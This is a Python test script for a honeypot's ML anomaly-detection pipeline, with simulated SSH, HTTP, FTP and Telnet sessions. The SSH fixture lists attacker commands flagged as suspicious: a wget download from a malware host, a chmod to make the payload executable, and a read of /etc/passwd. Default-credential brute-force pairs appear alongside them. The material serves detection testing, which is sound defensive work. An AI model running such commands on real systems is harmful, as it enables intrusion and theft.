#!/usr/bin/env python3
"""
Pipeline Trigger Test - Verify ML prediction triggers for each protocol
after session ends
"""

import sys
import json
from datetime import datetime, timedelta
sys.path.insert(0, 'src')

from core.session_manager import SessionManager
from core.feature_builder import FeatureBuilder
from core.logger import HoneypotLogger
from ml.predict import predict_session_anomaly

print("\n" + "=" * 80)
print("  ML PIPELINE TRIGGER TEST - ALL PROTOCOLS")
print("=" * 80)

# Initialize logger and session manager
logger = HoneypotLogger("logs/test_pipeline.jsonl", "logs/test_errors.log")
session_manager = SessionManager()

print("\nTest Strategy:")
print("  1. Create session for each protocol")
print("  2. Add login attempts and commands")
print("  3. Finalize session")
print("  4. Extract features (FeatureBuilder)")
print("  5. Run ML prediction")
print("  6. Log results")
print("  7. Verify pipeline flow")
print()

# Test data for each protocol
protocols_data = {
    "ssh": {
        "ip": "192.168.1.100",
        "login_attempts": [
            {"username": "admin", "password": "secret123"},
            {"username": "root", "password": "password"},
        ],
        "commands": [
            {"command": "ls -la", "is_suspicious": False},
            {"command": "wget http://malware.com/payload.sh", "is_suspicious": True},
            {"command": "chmod +x /tmp/payload.sh", "is_suspicious": True},
            {"command": "cat /etc/passwd", "is_suspicious": True},
        ],
        "expected": "attack (multiple suspicious commands)",
    },
    "http": {
        "ip": "192.168.1.101",
        "login_attempts": [
            {"username": "admin", "password": "admin123"},
        ],
        "commands": [],  # HTTP is stateless, no commands logged
        "expected": "normal or low-medium (single login)",
    },
    "ftp": {
        "ip": "192.168.1.102",
        "login_attempts": [
            {"username": "ftp", "password": "ftp"},
            {"username": "root", "password": "root"},
            {"username": "admin", "password": "admin"},
            {"username": "test", "password": "test"},
        ],
        "commands": [
            {"command": "LIST", "is_suspicious": False},
            {"command": "RETR important.doc", "is_suspicious": False},
        ],
        "expected": "attack (multiple login attempts - brute force)",
    },
    "telnet": {
        "ip": "192.168.1.103",
        "login_attempts": [
            {"username": "admin", "password": "password"},
        ],
        "commands": [
            {"command": "show version", "is_suspicious": False},
            {"command": "enable", "is_suspicious": False},
            {"command": "show running-config", "is_suspicious": False},
        ],
        "expected": "normal (legitimate admin activity)",
    },
}

print("=" * 80)
print("PROTOCOL PIPELINE TESTS")
print("=" * 80)

for protocol, test_data in protocols_data.items():
    print(f"\n{'=' * 80}")
    print(f"  PROTOCOL: {protocol.upper()}")
    print(f"{'=' * 80}")
    
    # STEP 1: Create session
    print(f"\n[1] CREATE SESSION")
    session_id = session_manager.create_session(
        ip=test_data["ip"],
        protocol=protocol
    )
    print(f"    ✓ Session created: {session_id[:12]}...")
    print(f"    ✓ Protocol: {protocol}")
    print(f"    ✓ Source IP: {test_data['ip']}")
    
    # STEP 2: Add login attempts
    print(f"\n[2] LOG LOGIN ATTEMPTS")
    for attempt in test_data["login_attempts"]:
        session_manager.add_login_attempt(
            session_id=session_id,
            username=attempt["username"],
            password=attempt["password"]
        )
        print(f"    ✓ Logged: {attempt['username']}")
    print(f"    Total attempts: {len(test_data['login_attempts'])}")
    
    # STEP 3: Add commands
    print(f"\n[3] LOG COMMANDS")
    if test_data["commands"]:
        for cmd in test_data["commands"]:
            session_manager.add_command(
                session_id=session_id,
                command=cmd["command"],
                is_suspicious=cmd["is_suspicious"]
            )
            suspicious_marker = "[SUSPICIOUS]" if cmd["is_suspicious"] else "[NORMAL]"
            print(f"    ✓ {suspicious_marker} {cmd['command']}")
        print(f"    Total commands: {len(test_data['commands'])}")
    else:
        print(f"    (No commands for this protocol)")
    
    # STEP 4: Finalize session
    print(f"\n[4] FINALIZE SESSION")
    session_payload = session_manager.finalize_session(session_id)
    print(f"    ✓ Session payload created")
    print(f"    ✓ Duration: {session_payload.get('duration', 0):.2f}s")
    print(f"    ✓ Login attempts in payload: {len(session_payload.get('login_attempts', []))}")
    print(f"    ✓ Commands in payload: {len(session_payload.get('commands', []))}")
    
    # STEP 5: Extract features
    print(f"\n[5] EXTRACT FEATURES (FeatureBuilder)")
    try:
        session_record = FeatureBuilder.build(session_payload)
        print(f"    ✓ Features extracted successfully")
        print(f"    ✓ total_login_attempts: {session_record.get('total_login_attempts', 0)}")
        print(f"    ✓ commands_count: {session_record.get('commands_count', 0)}")
        print(f"    ✓ suspicious_commands_count: {session_record.get('suspicious_commands_count', 0)}")
        print(f"    ✓ duration: {session_record.get('duration', 0):.2f}s")
        print(f"    ✓ attack_ratio: {session_record.get('attack_ratio', 0):.2f}")
    except Exception as e:
        print(f"    ✗ Feature extraction error: {e}")
        continue
    
    # STEP 6: Run ML prediction
    print(f"\n[6] RUN ML PREDICTION")
    try:
        prediction = predict_session_anomaly(session_record)
        print(f"    ✓ Prediction successful")
        print(f"    ✓ Anomaly: {prediction['anomaly'].upper()}")
        print(f"    ✓ Score: {prediction['anomaly_score']:.4f}")
        print(f"    ✓ Severity: {prediction['severity'].upper()}")
        
        # Attach to record
        session_record["anomaly"] = prediction["anomaly"]
        session_record["anomaly_score"] = prediction["anomaly_score"]
        session_record["severity"] = prediction["severity"]
        
    except Exception as e:
        print(f"    ✗ ML prediction error: {e}")
        continue
    
    # STEP 7: Log session
    print(f"\n[7] LOG SESSION TO JSONL")
    try:
        logger.log_session(session_record)
        print(f"    ✓ Session logged to logs/test_pipeline.jsonl")
        
        # Verify it was written
        with open("logs/test_pipeline.jsonl", "r") as f:
            lines = f.readlines()
            if lines:
                last_entry = json.loads(lines[-1])
                if last_entry.get("session_id") == session_id:
                    print(f"    ✓ Verified: Session found in log file")
                    print(f"    ✓ Logged anomaly: {last_entry.get('anomaly')}")
                    print(f"    ✓ Logged severity: {last_entry.get('severity')}")
                else:
                    print(f"    ⚠ Session ID mismatch in log")
    except Exception as e:
        print(f"    ✗ Logging error: {e}")
        continue
    
    # STEP 8: Pipeline summary
    print(f"\n[8] PIPELINE SUMMARY FOR {protocol.upper()}")
    print(f"    ✓ Session → Features → Prediction → Logged")
    print(f"    Expected: {test_data['expected']}")
    print(f"    Actual:   {prediction['anomaly']} ({prediction['severity']})")
    
    # Verify pipeline matched expectation
    if ("attack" in test_data["expected"] and prediction["anomaly"] == "attack") or \
       ("normal" in test_data["expected"] and prediction["anomaly"] == "normal") or \
       ("low-medium" in test_data["expected"]):
        print(f"    ✓ PIPELINE TRIGGERED CORRECTLY")
    else:
        print(f"    ⚠ Prediction differs from expected")

# Final verification
print(f"\n{'=' * 80}")
print("PIPELINE VERIFICATION SUMMARY")
print(f"{'=' * 80}\n")

print("Protocol Pipeline Flow (All Streams):")
print("""
┌─────────────────────────────────────────────────────────────────────┐
│                      SESSION LIFECYCLE                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. Connection Accepted                                             │
│     └─ SessionManager.create_session()                              │
│                                                                      │
│  2. Authentication & Commands Logged                                │
│     ├─ SessionManager.add_login_attempt()  [All protocols]          │
│     └─ SessionManager.add_command()        [SSH, FTP, Telnet]       │
│                                                                      │
│  3. Session Ends (Connection Closed)                                │
│     └─ SessionManager.finalize_session()                            │
│        └─ Returns complete session payload                          │
│                                                                      │
│  4. Feature Extraction                                              │
│     └─ FeatureBuilder.build(payload)                                │
│        └─ Extracts 7 ML features from payload                       │
│                                                                      │
│  5. ML Prediction ⭐ PIPELINE TRIGGER                              │
│     └─ predict_session_anomaly(features)                            │
│        ├─ Loads models (isolation_forest.pkl + scaler.pkl)          │
│        ├─ Normalizes features                                       │
│        ├─ Runs ML prediction                                        │
│        └─ Returns: anomaly, score, severity                         │
│                                                                      │
│  6. Enrich Record                                                   │
│     └─ Attach prediction results to session record                  │
│        ├─ anomaly (normal/attack)                                   │
│        ├─ anomaly_score (float)                                     │
│        └─ severity (low/medium/high)                                │
│                                                                      │
│  7. Log to JSONL                                                    │
│     └─ HoneypotLogger.log_session()                                 │
│        └─ Write to logs/sessions.jsonl                              │
│                                                                      │
│  8. SIEM Ingestion                                                  │
│     └─ Complete session with ML predictions ready for analysis      │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
""")

print("Protocol Implementation Status:")
print("""
✓ SSH            - Pipeline: Connection → Auth → Commands → ML → Logged
✓ FTP            - Pipeline: Connection → Auth → Commands → ML → Logged
✓ Telnet         - Pipeline: Connection → Auth → Commands → ML → Logged
✓ HTTP           - Pipeline: Per-request logging (stateless, no global session)
""")

print("\nML Pipeline Trigger Points:")
print("""
✓ SSH:     On ssh_handler.py line ~150 (finally block after session ends)
✓ FTP:     On ftp_handler.py line ~78 (finally block after session ends)
✓ Telnet:  On telnet_handler.py line ~154 (finally block after session ends)
✓ HTTP:    Per-request in http_server.py (no session end hook)
""")

with open("logs/test_pipeline.jsonl", "r") as f:
    entries = len(f.readlines())

print(f"\nLogged Sessions in Test Pipeline: {entries}")
print(f"Expected: 4 (one per protocol)")
print(f"Status: {'✓ ALL SESSIONS LOGGED' if entries == 4 else '⚠ Check logs'}")

print("\n" + "=" * 80)
print("  ✓ ML PIPELINE TRIGGER VERIFICATION COMPLETE")
print("=" * 80 + "\n")
